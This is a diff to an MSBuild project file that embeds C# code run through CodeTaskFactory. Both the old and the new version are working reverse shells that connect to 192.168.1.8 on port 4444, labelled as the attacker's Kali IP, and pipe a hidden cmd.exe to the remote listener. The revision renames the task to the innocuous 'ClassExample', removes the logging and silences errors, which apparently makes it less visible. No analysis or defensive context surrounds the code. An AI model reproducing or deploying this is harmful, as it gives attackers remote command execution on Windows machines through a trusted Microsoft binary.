@@ -1,90 +1,76 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="Connect">
-    <ReverseShell />
+  <Target Name="MSBuild">
+    <ClassExample />
   </Target>
-  
-  <UsingTask TaskName="ReverseShell" TaskFactory="CodeTaskFactory" 
-             AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+  <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
+      <Reference Include="System" />
+      <Reference Include="System.Net" />
+      <Reference Include="System.IO" />
       <Code Type="Class" Language="cs">
         <![CDATA[
         using System;
         using System.Net.Sockets;
-        using System.Diagnostics;
         using System.Text;
+        using System.Diagnostics;
         using System.IO;
-        using System.Threading;
-
-        public class ReverseShell : Microsoft.Build.Utilities.Task {
-            public override bool Execute() {
-                Thread thread = new Thread(new ThreadStart(StartShell));
-                thread.IsBackground = true;
-                thread.Start();
-                return true;
-            }
-            
-            private void StartShell() {
-                string host = "192.168.1.8";  // CHANGE TO YOUR KALI IP
-                int port = 4444;
-                
-                try {
-                    // Write debug info
-                    File.WriteAllText("C:\\Windows\\Temp\\msbuild.log", "Starting connection to " + host + ":" + port + " at " + DateTime.Now.ToString());
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        
+        public class ClassExample : Task, ITask
+        {
+            public override bool Execute()
+            {
+                try
+                {
+                    string host = "192.168.1.8";
+                    int port = 4444;
                     
-                    using(TcpClient client = new TcpClient(host, port)) {
-                        File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nConnected successfully!");
-                        
-                        using(NetworkStream stream = client.GetStream()) {
-                            // Send welcome message
-                            string welcome = "=== Reverse Shell Connected ===\\n";
-                            byte[] welcomeBytes = Encoding.ASCII.GetBytes(welcome);
-                            stream.Write(welcomeBytes, 0, welcomeBytes.Length);
+                    using (TcpClient client = new TcpClient(host, port))
+                    {
+                        using (NetworkStream stream = client.GetStream())
+                        using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
+                        using (StreamWriter writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true })
+                        {
+                            Process process = new Process();
+                            process.StartInfo.FileName = "cmd.exe";
+                            process.StartInfo.CreateNoWindow = true;
+                            process.StartInfo.UseShellExecute = false;
+                            process.StartInfo.RedirectStandardOutput = true;
+                            process.StartInfo.RedirectStandardInput = true;
+                            process.StartInfo.RedirectStandardError = true;
                             
-                            byte[] buffer = new byte[1024];
-                            int bytesRead;
+                            process.OutputDataReceived += (s, e) => {
+                                if (!string.IsNullOrEmpty(e.Data))
+                                {
+                                    writer.WriteLine(e.Data);
+                                }
+                            };
                             
-                            while((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0) {
-                                string command = Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim();
+                            process.Start();
+                            process.BeginOutputReadLine();
+                            
+                            // Command loop
+                            while (true)
+                            {
+                                string input = reader.ReadLine();
+                                if (string.IsNullOrEmpty(input)) continue;
+                                if (input.ToLower() == "exit") break;
                                 
-                                if (command == "exit") break;
-                                if (string.IsNullOrEmpty(command)) continue;
-                                
-                                string result = ExecuteCommand(command);
-                                byte[] output = Encoding.ASCII.GetBytes(result);
-                                stream.Write(output, 0, output.Length);
-                                stream.Flush();
+                                process.StandardInput.WriteLine(input);
                             }
                         }
                     }
-                    File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nConnection closed normally");
-                } catch (Exception ex) {
-                    File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nError: " + ex.Message);
                 }
-            }
-            
-            private string ExecuteCommand(string command) {
-                try {
-                    Process process = new Process();
-                    process.StartInfo.FileName = "cmd.exe";
-                    process.StartInfo.Arguments = "/c " + command;
-                    process.StartInfo.RedirectStandardOutput = true;
-                    process.StartInfo.RedirectStandardError = true;
-                    process.StartInfo.UseShellExecute = false;
-                    process.StartInfo.CreateNoWindow = true;
-                    process.Start();
-                    
-                    string output = process.StandardOutput.ReadToEnd();
-                    string error = process.StandardError.ReadToEnd();
-                    process.WaitForExit();
-                    
-                    if (!string.IsNullOrEmpty(error)) {
-                        output = output + "\\n" + error;
-                    }
-                    
-                    return output;
-                } catch (Exception ex) {
-                    return "Error executing command: " + ex.Message + "\\n";
+                catch (Exception ex)
+                {
+                    // Silent failure - remove this in production
+                    // System.IO.File.WriteAllText(@"C:\Windows\Temp\debug.txt", ex.ToString());
                 }
+                return true;
             }
         }
         ]]>
